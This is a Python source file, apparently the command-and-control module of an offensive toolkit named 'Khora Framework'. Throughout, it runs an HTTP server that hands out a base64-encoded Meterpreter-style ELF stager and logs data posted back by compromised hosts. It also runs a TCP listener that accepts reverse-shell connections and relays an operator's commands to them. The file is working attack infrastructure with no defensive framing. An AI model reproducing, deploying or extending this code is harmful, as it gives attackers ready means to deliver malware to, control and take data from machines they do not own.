from http.server import HTTPServer, BaseHTTPRequestHandler
import base64
import threading
import socket

class C2Module:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    
    def http_server(self):
        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/stager':
                    try:
                        with open('payloads/linux_x64_meter.elf', 'rb') as f:
                            data = base64.b64encode(f.read()).decode()
                        self.send_response(200)
                        self.send_header('Content-Type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(data.encode())
                        print(f"[C2] Stager served to {self.client_address}")
                    except FileNotFoundError:
                        print(f"[!] Stager payloads/linux_x64_meter.elf not found")
                        self.send_response(404)
                        self.end_headers()
                    except Exception as e:
                        print(f"[!] HTTP error: {e}")
                        self.send_response(500)
                        self.end_headers()
            
            def do_POST(self):
                try:
                    content_len = int(self.headers['Content-Length'])
                    data = self.rfile.read(content_len).decode()
                    print(f"[C2] {self.client_address}: {data}")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"OK")
                except:
                    self.send_response(400)
                    self.end_headers()
        
        server = HTTPServer((self.lhost, 8080), Handler)
        print(f"[+] HTTP C2 server started: http://{self.lhost}:8080/stager")
        server.serve_forever()
    
    def tcp_listener(self):
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.lhost, self.lport))
        s.listen(20)
        print(f"[+] TCP C2 listener: {self.lhost}:{self.lport}")
        while True:
            client, addr = s.accept()
            print(f"[+] Shell connection from {addr}")
            threading.Thread(target=self.handle_shell, args=(client, addr), daemon=True).start()
    
    def handle_shell(self, client, addr):
        client.send(b"Khora C2 shell> ")
        while True:
            try:
                cmd = input(f"shell[{addr}]> ")
                if cmd.lower() in ['exit', 'quit']: 
                    client.send(b"exit\n")
                    break
                client.send((cmd + '\n').encode())
                result = client.recv(4096).decode('utf-8', errors='ignore')
                print(result, end='')
            except (ConnectionResetError, BrokenPipeError):
                print(f"\n[-] {addr} disconnected")
                break
            except Exception as e:
                print(f"\n[!] Shell error: {e}")
                break
        client.close()

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - C2 Infrastructure"""
    print(f"[+] C2 module: Starting servers for {target}")
    print(f"[+] HTTP stager: http://{lhost}:8080/stager")
    print(f"[+] TCP shells: {lhost}:{lport}")
    
    c2 = C2Module(lhost, lport)
    
    # Start HTTP server in background thread
    http_thread = threading.Thread(target=c2.http_server, daemon=True)
    http_thread.start()
    
    # Start TCP listener (foreground)
    try:
        c2.tcp_listener()
    except KeyboardInterrupt:
        print("\n[+] C2 servers stopped")